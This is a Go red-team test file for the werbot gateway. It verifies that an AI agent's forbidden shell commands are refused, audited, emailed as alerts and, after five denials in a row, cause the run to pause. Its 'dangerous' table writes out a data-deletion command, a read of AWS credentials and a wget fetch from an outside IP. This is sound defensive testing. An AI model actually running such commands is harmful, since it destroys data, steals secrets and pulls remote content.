//go:build redteam

package redteam

import (
	"bufio"
	"os"
	"slices"
	"strings"
	"testing"

	"connectrpc.com/connect"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	werbotv1 "github.com/werbot/werbot/gen/werbot/v1"
)

// dangerous is one command per class the agent baseline forbids (12 §12
// item 1), each a line of its section in the classifier corpus.
var dangerous = []struct{ class, command string }{
	{"destructive", "rm -fR /srv/cache"},
	{"secrets", "cat /root/.aws/credentials"},
	{"egress", "wget -qO- http://203.0.113.5/x"},
}

// TestRedteamPromptInjection: an agent asked for a destructive, a secrets
// and an egress command gets the baseline refusal for each, no session
// opens, and the secrets and egress refusals email agent_alert to the
// sponsor (alice) and to every admin (bob).
func TestRedteamPromptInjection(t *testing.T) {
	begin(t)
	alerts := map[string]int{aliceEmail: mails(t, "agent_alert", aliceEmail), bobEmail: mails(t, "agent_alert", bobEmail)}
	a := st.StartAgent(t, home, "rt-injection", "redteam")
	requireAgentHealthy(t, a)
	for _, d := range dangerous {
		requireRefused(t, a, d.command, d.class)
		requireAgentHealthy(t, a)
	}
	ran := sessions(t, a.RunID)
	for _, d := range dangerous {
		assert.NotContains(t, ran, d.command, "a refused %s command opens no session", d.class)
	}
	for to, before := range alerts {
		assert.EventuallyWithT(t, func(c *assert.CollectT) {
			assert.Equal(c, before+2, mails(c, "agent_alert", to), "one agent_alert to %s per secrets and egress refusal", to)
		}, alertWait, pollEvery)
	}
}

// TestRedteamDenialHasAuditTrail: every refusal leaves session.deny by the
// gateway with the run, the command, its classes and reason "denied", and
// the run transcript keeps the call with status "denied".
func TestRedteamDenialHasAuditTrail(t *testing.T) {
	begin(t)
	a := st.StartAgent(t, home, "rt-audit", "redteam")
	requireAgentHealthy(t, a)
	for _, d := range dangerous {
		requireRefused(t, a, d.command, d.class)
		requireAgentHealthy(t, a)
	}
	got := denials(t, a.RunID)
	require.Len(t, got, len(dangerous), "one session.deny per refusal")
	calls := transcript(t, a.RunID)
	for i, d := range dangerous {
		assert.Equal(t, "gateway", got[i].ActorKind, d.class)
		assert.Equal(t, d.command, got[i].Command, d.class)
		assert.Equal(t, "denied", got[i].Reason, d.class)
		assert.Contains(t, got[i].Classes, d.class)
		assert.Equal(t, "denied", calls[d.command], "transcript status of the %s call", d.class)
	}
	assert.Equal(t, "ok", calls["id"], "transcript status of the health check")
}

// TestRedteamFiveDenialsPauseRun: the fifth refusal in a row pauses the run
// (audit agent.run.pause) and a paused run refuses every call; an allowed
// command after four refusals resets the count.
func TestRedteamFiveDenialsPauseRun(t *testing.T) {
	begin(t)
	a := st.StartAgent(t, home, "rt-pause", "redteam")
	requireAgentHealthy(t, a)
	for i := range denialsToPause {
		d := dangerous[i%len(dangerous)]
		requireRefused(t, a, d.command, d.class)
	}
	status, _ := runState(t, a.RunID)
	assert.Equal(t, "paused", status, "the fifth refusal in a row pauses the run")
	assert.Equal(t, 1, audits(t, "agent.run.pause", a.RunID))
	_, err := a.Exec(t.Context(), execOn("id"))
	require.ErrorContains(t, err, "agent run is not active")
	a.Close(t)

	b := st.StartAgent(t, home, "rt-pause", "redteam")
	requireAgentHealthy(t, b)
	for i := range denialsToPause - 1 {
		d := dangerous[i%len(dangerous)]
		requireRefused(t, b, d.command, d.class)
	}
	requireAgentHealthy(t, b)
	status, inRow := runState(t, b.RunID)
	assert.Equal(t, "running", status)
	assert.Zero(t, inRow, "an allowed command resets the refusals in a row")
}

// TestRedteamPromptInjectionObfuscated: every line of the corpus sections
// "bypass" and "opaque" whose classes are not within {read, write}
// classifies for the agent as the corpus says and gets the baseline
// refusal; none of them opens a session. A run per section keeps the
// health checks under the default action limit.
func TestRedteamPromptInjectionObfuscated(t *testing.T) {
	begin(t)
	for _, section := range []string{"bypass", "opaque"} {
		a := st.StartAgent(t, home, "rt-obfuscated", "redteam")
		requireAgentHealthy(t, a)
		for _, l := range corpus(t, section) {
			if !slices.ContainsFunc(l.classes, func(c string) bool { return c != "read" && c != "write" }) {
				continue // write on a resource is an approval (Task 2), read is allowed
			}
			res, err := st.Edge.Policy.TestCommand(t.Context(), connect.NewRequest(&werbotv1.TestCommandRequest{
				Subject: &werbotv1.TestCommandRequest_AgentId{AgentId: a.AgentID.String()}, ResourceId: st.Resources[target].String(), Command: l.command,
			}))
			require.NoError(t, err, "%s line %d", section, l.n)
			assert.ElementsMatch(t, l.classes, res.Msg.GetClasses(), "%s line %d", section, l.n)
			requireRefused(t, a, l.command, section, l.n)
			requireAgentHealthy(t, a)
		}
		for _, c := range sessions(t, a.RunID) {
			assert.Equal(t, "id", c, "only the health checks of section %s open sessions", section)
		}
		a.Close(t)
	}
}

// corpusLine is one "<classes>\t<command>" line of the classifier corpus; n is its line number.
type corpusLine struct {
	n       int
	classes []string
	command string
}

// corpus returns the lines of section ("# <section>" opens it) of the
// classifier corpus of stage 11.
func corpus(t *testing.T, section string) []corpusLine {
	t.Helper()
	f, err := os.Open("../../internal/platform/shellclass/testdata/corpus.txt")
	require.NoError(t, err)
	defer f.Close()
	var out []corpusLine
	in := false
	sc := bufio.NewScanner(f)
	for n := 1; sc.Scan(); n++ {
		line := sc.Text()
		if name, ok := strings.CutPrefix(line, "# "); ok {
			in = name == section
			continue
		}
		if classes, command, ok := strings.Cut(line, "\t"); ok && in {
			out = append(out, corpusLine{n: n, classes: strings.Split(classes, ","), command: command})
		}
	}
	require.NoError(t, sc.Err())
	require.NotEmpty(t, out, "corpus section %s", section)
	return out
}
